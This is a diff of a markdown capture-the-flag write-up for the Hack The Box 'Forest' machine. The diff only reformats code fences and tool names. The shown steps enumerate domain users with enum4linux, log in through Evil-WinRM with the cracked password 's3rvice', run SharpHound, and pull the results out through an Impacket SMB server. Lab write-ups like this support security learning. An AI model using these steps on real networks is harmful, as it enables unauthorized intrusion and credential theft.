@@ -57,7 +57,7 @@ Host script results:
 
 Given we have `LDAP port 389` we can use `Enum4Linux` to enumerate this LDAP service for users.
 
-```text
+```shell
 $ enum4linux -a 10.10.10.161 2> /dev/null
 user:[Administrator] rid:[0x1f4]
 user:[Guest] rid:[0x1f5]
@@ -94,7 +94,8 @@ user:[santi] rid:[0x480]
 
 Fantastic! We have a list of users we can use against other tools to see if we can get any user hashes. We can clean up this list with a simple one liner: `cat newusers| tr -d "[]" | awk -F: {'print $2'} | awk -F" " '{print $1}' > cleanusers`
 
-```Administrator
+```shell
+Administrator
 Guest
 krbtgt
 DefaultAccount
@@ -169,7 +170,7 @@ s3rvice          ($krb5asrep$23$svc-alfresco@HTB.LOCAL)
 
 ### Shell
 
-Using Evil-WinRM we can use the credentials to log into a Windows Remote Management shell as the svc-alfresco user.
+Using `Evil-WinRM` we can use the credentials to log into a Windows Remote Management shell as the svc-alfresco user.
 
 ```shell
 $ evil-winrm -i 10.10.10.161 -u svc-alfresco -p 's3rvice'
@@ -179,8 +180,8 @@ $ evil-winrm -i 10.10.10.161 -u svc-alfresco -p 's3rvice'
 ```
 
 ## Bloodhound
-I used Bloodhound to enumerate this machine and find relationships between the users and groups. To do this you must first upload SharpHound.exe to the remote machine through Evil-WinRM and collect all the information you can.
+I used `Bloodhound` to enumerate this machine and find relationships between the users and groups. To do this you must first upload SharpHound.exe to the remote machine through `Evil-WinRM` and collect all the information you can.
 
 ![SharpHound](https://mitchelldstein.github.io/assets/images/Forest/SharpHound.png)
 
-To get the created json files off the machine, you can use Impacket-SmbServer and connect to it through Evil-WinRM.
+To get the created json files off the machine, you can use Impacket-SmbServer and connect to it through `Evil-WinRM`.
